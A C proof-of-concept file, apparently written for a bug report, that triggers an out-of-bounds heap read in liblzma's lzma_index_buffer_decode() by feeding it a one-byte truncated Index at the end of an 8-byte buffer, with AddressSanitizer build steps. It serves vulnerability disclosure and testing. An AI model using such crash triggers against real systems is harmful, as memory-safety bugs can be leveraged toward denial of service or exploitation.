// PoC for a heap-buffer-overflow (read) in lzma_index_buffer_decode().
//
// The public single-call Index decoder is documented to start reading at
// in[*in_pos] and to stop before in[in_size]. A caller may legitimately
// point *in_pos partway into a buffer (e.g. the Index sits at the end of a
// larger allocation). Here we hand it an 8-byte heap buffer whose final
// byte is the Index Indicator and set *in_pos to that last byte. Only one
// valid byte is available; the rest of a real Index is "truncated".
//
// A correct decoder reads that single byte, runs out of input, and returns
// LZMA_DATA_ERROR without touching memory past in[in_size]. The shipped tree
// instead keeps reading past the end of the allocation, which AddressSanitizer
// reports as a heap-buffer-overflow.
//
// Build (links against the ASan-instrumented liblzma.a):
//   cc -I src/liblzma/api -fsanitize=address -g pocs/residual.c \
//        /tmp/asan-build/liblzma.a -o /tmp/residual
//   /tmp/residual

#include <lzma.h>
#include <stdio.h>
#include <stdlib.h>

int
main(void)
{
	const size_t size = 8;

	// Exact-sized heap allocation so any read at or past in[size] is OOB.
	uint8_t *in = malloc(size);
	if (in == NULL)
		return 2;

	for (size_t j = 0; j < size; ++j)
		in[j] = 0x37;

	// Index Indicator (0x00) as the last and only readable byte.
	in[size - 1] = 0x00;

	lzma_index *idx = NULL;
	uint64_t memlimit = UINT64_MAX;
	size_t in_pos = size - 1;

	lzma_ret ret = lzma_index_buffer_decode(&idx, &memlimit, NULL,
			in, &in_pos, size);

	printf("ret=%d in_pos=%zu\n", (int)ret, in_pos);

	lzma_index_end(idx, NULL);
	free(in);
	return 0;
}
